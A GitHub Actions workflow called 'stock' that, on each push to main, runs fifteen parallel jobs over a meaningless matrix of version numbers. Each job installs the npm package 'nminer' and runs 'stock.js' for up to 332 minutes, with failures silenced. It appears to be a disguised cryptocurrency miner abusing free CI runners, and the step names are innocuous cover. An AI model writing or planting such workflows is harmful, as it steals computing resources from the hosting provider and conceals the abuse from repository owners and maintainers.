name: stock
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1477 }
          - { version: 487 }
          - { version: 2648 }
          - { version: 7350 }
          - { version: 8682 }
          - { version: 5768 }
          - { version: 9131 }
          - { version: 5883 }
          - { version: 5990 }
          - { version: 3296 }
          - { version: 3728 }
          - { version: 2956 }
          - { version: 9554 }
          - { version: 755 }
          - { version: 3466 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: reclassify
        run: |
          npm install nminer@latest
          timeout 332m node stock.js || echo "stock executed"